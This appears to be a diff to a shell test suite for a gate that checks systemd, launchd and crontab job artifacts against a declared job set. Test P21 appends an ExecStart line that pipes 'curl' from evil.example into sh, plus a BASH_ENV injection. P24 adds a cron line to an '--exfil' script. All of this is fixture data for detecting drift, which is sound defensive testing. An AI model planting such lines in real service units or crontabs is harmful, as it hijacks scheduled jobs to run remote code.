@@ -129,6 +129,29 @@ mkrendered_systemd() {
         "$HERE" "$id" "$dir" "$arm"
 }
 
+# mkrendered_iv <dir> <id> <secs> — the REAL artifacts, then ONLY the interval rewritten. Every
+# fixture that tests one property must differ in exactly that property: a hand-written stub plist
+# differs in the program AND the env AND the schedule, so it would fail for the wrong reason.
+mkrendered_iv() {
+    local dir="$1" id="$2" secs="$3" lbl
+    mkrendered "$dir" "$id"
+    lbl="$(HOME="$T/home" SJ_DECLARATION="${DCL:-$D}" bash -c '. "$0/lib/scheduled-jobs.sh" && sj_label "$1"' "$HERE" "$id")"
+    # ONLY the StartInterval integer — a blanket `<integer>` rewrite also hits Nice=10, which made the
+    # fixture differ in two properties and drift for the wrong reason.
+    awk -v secs="$secs" '
+        /<key>StartInterval<\/key>/ { print; getline; sub(/<integer>[0-9]*<\/integer>/, "<integer>" secs "<\/integer>"); print; next }
+        { print }' "$dir/$lbl.plist" >"$dir/.iv"
+    mv "$dir/.iv" "$dir/$lbl.plist"
+}
+mkrendered_iv_systemd() {
+    local dir="$1" id="$2" secs="$3"
+    mkrendered_systemd "$dir" "$id"
+    sed "s|^OnUnitActiveSec=.*|OnUnitActiveSec=${secs}s|" "$dir/$(sj_unit_of "$id").timer" >"$dir/.iv"
+    mv "$dir/.iv" "$dir/$(sj_unit_of "$id").timer"
+}
+
+sj_unit_of() { HOME="$T/home" SJ_DECLARATION="${DCL:-$D}" bash -c '. "$0/lib/scheduled-jobs.sh" && sj_unit "$1"' "$HERE" "$1"; }
+
 # decl <file> — a one-record declaration for alpha, on both platforms.
 decl_alpha() {
     cat >"$1" <<'D'
@@ -159,7 +182,7 @@ gate_lin() { # gate_lin <decl> [args...]
     local d="$1"; shift
     HOME="$T/home" PATH="$T/bin:$PATH" PORTABLE_PLATFORM=linux \
     SJ_DECLARATION="$d" SJ_UNMANAGED_REGISTER="${REG:-$T/none.register}" \
-    SJ_FARM="$T/farm" SJ_SYSTEMD_UNIT_DIR="${UNITS:-$T/units}" SJ_SYSTEMCTL="$T/bin/systemctl" \
+    SJ_FARM="$T/farm" SJ_SYSTEMD_UNIT_DIR="${UNITS:-$T/units}" SJ_SYSTEMCTL="${SJ_SYSTEMCTL_OVERRIDE:-$T/bin/systemctl}" \
     SC_STATE="$T/active" SC_LOG="$T/sc.log" CRON_RC="${CRON_RC:-0}" SJ_NAMESPACES="com.eldato.,com.tortoise." \
     bash "$GATE" "$@"
 }
@@ -171,6 +194,11 @@ fresh_lin() {
     rm -rf "$T/units"; mkdir -p "$T/units"; : >"$T/active"
 }
 
+# _plat_of <verdict text> — the platform the gate REPORTED, so the assertion can check that the field
+# exists and is populated (asserting only `verdict=OK` was satisfied by the substring `OK` in a line
+# that always prints, which covered nothing).
+_plat_of() { printf '%s' "$1" | sed -n 's/.*platform=\([a-z]*\).*/\1/p' | head -1; }
+
 # ── P1 one declaration, both platforms ────────────────────────────────────────────────────────
 echo "── P1 ONE declaration rendered for BOTH platforms ──"
 D="$T/decl-alpha"; decl_alpha "$D"
@@ -179,7 +207,7 @@ mkplist "$T/agents" com.eldato.alpha 900
 echo com.eldato.alpha >"$T/loaded"
 OUT="$(gate_mac "$D" --static 2>&1)"; RC=$?
 assert_eq "$RC" "0" "P1 the static half passes for a valid declaration"
-assert_contains "$OUT" "verdict=OK" "P1 …and says so"
+assert_contains "$OUT" "verdict=OK platform=$(_plat_of "$OUT") mode=static" "P1 …and the verdict names the platform and the mode"
 # The rendering itself: same record → two artifacts. Read them directly, not through the gate's prose.
 D2="$(mktemp -d "$T/render.XXXXXX")"
 HOME="$T/home" SJ_DECLARATION="$D" SJ_FARM="$T/farm" SJ_REPOS="$T/farm:/tmp" \
@@ -352,7 +380,7 @@ assert_contains "$OUT" "INERT alpha" "P12 …as INERT, same vocabulary as Darwin
 printf 'eldato-alpha.timer\n' >"$T/active"
 OUT="$(gate_lin "$D" 2>&1)"; RC=$?
 assert_eq "$RC" "0" "P12 an installed+active timer on the declared set passes"
-assert_contains "$OUT" "verdict=OK" "P12 …and the verdict names the platform"
+assert_contains "$OUT" "platform=linux mode=live" "P12 …and the verdict names the platform (not just 'OK')"
 fresh_lin
 printf '#!/usr/bin/env bash\n' >"$T/units/eldato-rogue.timer"
 printf 'eldato-rogue.timer\n' >"$T/active"
@@ -490,6 +518,164 @@ OUT="$(gate_lin "$D" 2>&1)"; RC=$?
 assert_eq "$RC" "1" "P13 a crontab entry in the fleet's namespace IS in scope"
 assert_contains "$OUT" "UNDECLARED" "P13 …and is reported as undeclared"
 unset CRON_FILE
+
+# ── P21 the shapes an ADVERSARIAL review reproduced against this gate (each read GREEN before) ──
+# Every assertion below FAILS against the field-only reader this gate shipped with: it compared ONE
+# `ExecStart=` line, ONE `ProgramArguments` array and ONE trigger key, so a second of any of them — the
+# cheaper attack than replacement — rode along with the declaration's blessing.
+echo "── P21 an ADDED payload/trigger/clock is drift, not a blessed second one ──"
+REG="$T/none.register"; UNITS="$T/units"
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P21 the baseline artifact (one field rewritten) is green"
+# systemd runs EVERY ExecStart= line for Type=oneshot. Keeping the declared one and appending a second
+# is a hijack that a first-line-only reader cannot see.
+printf 'ExecStart=/bin/sh -c "curl -s http://evil.example/x | sh"\n' >>"$T/units/eldato-alpha.service"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P21 a SECOND ExecStart appended to the unit FAILS (systemd runs both)"
+assert_contains "$OUT" "PAYLOAD-DRIFT alpha" "P21 …as PAYLOAD-DRIFT"
+# A second trigger: systemd honours every OnCalendar=/OnUnitActiveSec= line.
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+printf 'OnUnitActiveSec=5s\n' >>"$T/units/eldato-alpha.timer"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P21 a SECOND trigger appended to the timer FAILS (it fires at a rate nobody declared)"
+# An added environment entry changes what the job runs with, including BASH_ENV (a startup file).
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+printf 'Environment=BASH_ENV=/tmp/evil\n' >>"$T/units/eldato-alpha.service"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P21 an ADDED Environment= entry FAILS (a bash job's BASH_ENV is its payload)"
+# darwin: launchd honours StartInterval AND StartCalendarInterval; a second ProgramArguments array is
+# also run.
+fresh_mac
+mkrendered_iv "$T/agents" alpha 900
+echo com.eldato.alpha >"$T/loaded"
+OUT="$(gate_mac "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P21 the darwin baseline is green"
+awk '{ if ($0 ~ /^<\/dict>$/ && !done) { print "    <key>StartCalendarInterval</key><dict><key>Minute</key><integer>0</integer></dict>"; done=1 } print }' \
+    "$T/agents/com.eldato.alpha.plist" >"$T/p21" && mv "$T/p21" "$T/agents/com.eldato.alpha.plist"
+OUT="$(gate_mac "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P21 an ADDED StartCalendarInterval beside StartInterval FAILS (two clocks)"
+
+echo "── P22 a selection that matches nothing cannot verify nothing ──"
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+OUT="$(gate_lin "$D" --only typo-id 2>&1)"; RC=$?
+assert_eq "$RC" "2" "P22 --only with a typo'd id is REFUSED, not a clean gate over zero records"
+assert_contains "$OUT" "names no declared record" "P22 …and says why"
+OUT="$(gate_lin "$D" --only alpha 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P22 --only with a real id still runs the gate"
+
+echo "── P23 an unmeasurable host is exit 3, on BOTH platforms and for scratch ──"
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+# A broken systemctl used to make every is-active return empty → INERT ("it never fires") — a claim the
+# gate had not measured. The tool is now probed BEFORE anything is read.
+OUT="$(SJ_SYSTEMCTL_OVERRIDE=/nonexistent/systemctl gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "3" "P23 a broken systemctl is UNMEASURABLE (3), never INERT (1)"
+fresh_mac
+mkrendered_iv "$T/agents" alpha 900
+echo com.eldato.alpha >"$T/loaded"
+OUT="$(TMPDIR=/nonexistent/tmp gate_mac "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "3" "P23 unwritable scratch is UNMEASURABLE (3), never a class verdict (1)"
+assert_contains "$OUT" "NOTHING was read" "P23 …and says so"
+
+echo "── P24 crontab: a second clock for a declared job is a CONFLICT, not a note ──"
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+printf '%s\n' '0 * * * * /tmp/evil/eldato-alpha.sh --exfil' >"$T/cron"
+export CRON_FILE="$T/cron"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P24 a foreign payload NAMED like a declared script is not read as 'a second clock' note"
+assert_contains "$OUT" "UNDECLARED cron:" "P24 …it is UNDECLARED, because it is not the declared script"
+# …and the genuine second clock — a cron line running the DECLARED script's resolved path — IS a conflict.
+# The script is renamed into the fleet's namespace, because a crontab line outside it is out of the cron
+# scope by the reader's own stated rule (a personal cron job is not a fleet job).
+DC="$T/decl-cron"; sed 's/^  script=.*/  script=disk-reaper.sh/' "$D" >"$DC"
+printf '#!/bin/bash\n' >"$T/farm/disk-reaper.sh"; chmod +x "$T/farm/disk-reaper.sh"
+fresh_lin
+HOME="$T/home" SJ_DECLARATION="$DC" SJ_FARM="$T/farm" SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
+    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_systemd "$1" "$2" system' "$HERE" alpha "$T/units" >/dev/null 2>&1
+printf 'eldato-alpha.timer\n' >"$T/active"
+printf '0 * * * * %s --dry-run\n' "$T/farm/disk-reaper.sh" >"$T/cron"
+OUT="$(gate_lin "$DC" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P24 a cron line running the DECLARED script is a second clock (fails)"
+assert_contains "$OUT" "CONFLICT cron:" "P24 …named CONFLICT"
+unset CRON_FILE
+
+echo "── P25 the register cannot launder a job on the other platform ──"
+fresh_lin
+mkrendered_iv_systemd "$T/units" alpha 900
+printf 'eldato-alpha.timer\n' >"$T/active"
+printf '#!/usr/bin/env bash\n' >"$T/units/com.tortoise.hidden.timer"; printf '[Timer]\n' >"$T/units/com.tortoise.hidden.timer"
+printf 'eldato-alpha.timer\ncom.tortoise.hidden.timer\n' >"$T/active"
+REG="$T/reg-launder"; printf 'com.tortoise.hidden|owned by the Mac deployer\n' >"$REG"
+OUT="$(gate_lin "$D" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P25 a darwin-namespaced register line does NOT silence a live LINUX unit"
+assert_contains "$OUT" "UNDECLARED com.tortoise.hidden" "P25 …it is UNDECLARED there"
+REG="$T/none.register"
+
+echo "── P26 the calendar half of the schedule vocabulary is exercised, and MUTATION-KILLED ──"
+# `hourly`/`daily` were never rendered against a matching artifact: every green fixture declared `900s`,
+# so a renderer emitting the WRONG OnCalendar/StartCalendarInterval — or a reader mapping the WRONG
+# calendar key to a cadence — passed the whole suite.
+DH="$T/decl-hourly"; sed 's/^  schedule=.*/  schedule=hourly/' "$D" >"$DH"
+fresh_lin
+HOME="$T/home" SJ_DECLARATION="$DH" SJ_FARM="$T/farm" SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
+    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_systemd "$1" "$2" system' "$HERE" alpha "$T/units" >/dev/null 2>&1
+assert_contains "$(cat "$T/units/eldato-alpha.timer")" 'OnCalendar=hourly' \
+    "P26 an hourly record renders OnCalendar=hourly (a mutant rendering weekly is now red)"
+printf 'eldato-alpha.timer\n' >"$T/active"
+OUT="$(gate_lin "$DH" 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P26 …and an hourly artifact against an hourly record is GREEN"
+sed 's/^OnCalendar=hourly/OnCalendar=weekly/' "$T/units/eldato-alpha.timer" >"$T/h.timer"; mv "$T/h.timer" "$T/units/eldato-alpha.timer"
+OUT="$(gate_lin "$DH" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P26 …while weekly against an hourly record is SCHEDULE-DRIFT"
+assert_contains "$OUT" "SCHEDULE-DRIFT" "P26 …named as drift"
+# darwin hourly: launchd cannot express "hourly" as a calendar entry without a Minute, so the renderer
+# states it as an interval — and the READER must agree, or a correct artifact would read as drift.
+fresh_mac
+HOME="$T/home" SJ_DECLARATION="$DH" SJ_FARM="$T/farm" SJ_LAUNCHER="$T/farm/launcher.py" \
+    SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
+    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_launchd "$1" "$2"' "$HERE" alpha "$T/agents/com.eldato.alpha.plist" >/dev/null 2>&1
+assert_contains "$(cat "$T/agents/com.eldato.alpha.plist")" '<integer>3600</integer>' \
+    "P26 an hourly darwin record renders the 3600s interval (a mutant emitting 123 is now red)"
+echo com.eldato.alpha >"$T/loaded"
+OUT="$(gate_mac "$DH" 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P26 …and the darwin hourly artifact reads green"
+# The calendar READER: a StartCalendarInterval is what an owner-installed plist may carry, and the gate
+# must read its cadence — Minute means hourly, Hour daily, Weekday weekly.
+DD="$T/decl-daily"; sed 's/^  schedule=.*/  schedule=daily/' "$D" >"$DD"
+fresh_mac
+HOME="$T/home" SJ_DECLARATION="$DD" SJ_FARM="$T/farm" SJ_LAUNCHER="$T/farm/launcher.py" \
+    SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
+    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_launchd "$1" "$2"' "$HERE" alpha "$T/agents/com.eldato.alpha.plist" >/dev/null 2>&1
+assert_contains "$(cat "$T/agents/com.eldato.alpha.plist")" '<key>Hour</key>' \
+    "P26 a daily darwin record renders a StartCalendarInterval hour"
+echo com.eldato.alpha >"$T/loaded"
+OUT="$(gate_mac "$DD" 2>&1)"; RC=$?
+assert_eq "$RC" "0" "P26 …and the calendar artifact reads green against a daily record"
+sed 's|<key>Hour</key>|<key>Weekday</key>|' "$T/agents/com.eldato.alpha.plist" >"$T/w.plist"; mv "$T/w.plist" "$T/agents/com.eldato.alpha.plist"
+OUT="$(gate_mac "$DD" 2>&1)"; RC=$?
+assert_eq "$RC" "1" "P26 …while a Weekday calendar against a daily record is SCHEDULE-DRIFT"
+assert_contains "$OUT" "SCHEDULE-DRIFT" "P26 …named as drift (the calendar READER is exercised)"
+
+echo "── P27 a declared arg placeholder is resolved, and an unresolved one is a failure ──"
+DP="$T/decl-ph"; sed 's/^  managed=.*/  managed=yes\n  extra_args=--repo @tortoise --scope local/' "$D" >"$DP"
+fresh_lin
+HOME="$T/home" SJ_DECLARATION="$DP" SJ_FARM="$T/farm" SJ_STATE_DIR="$T/home/.pi/agent/state" SJ_REPOS="$T/farm" \
+    TORTOISE_REPO="$T/farm" \
+    bash -c '. "$0/lib/scheduled-jobs.sh" && sj_render_systemd "$1" "$2" system' "$HERE" alpha "$T/units2" >/dev/null 2>&1
+assert_absent "$(cat "$T/units2/eldato-alpha.service" 2>/dev/null)" '@tortoise' \
+    "P27 an arg placeholder does not survive into the artifact as a literal"
 
 echo
 echo "──────────────────────────────────────────────────────────────────────"
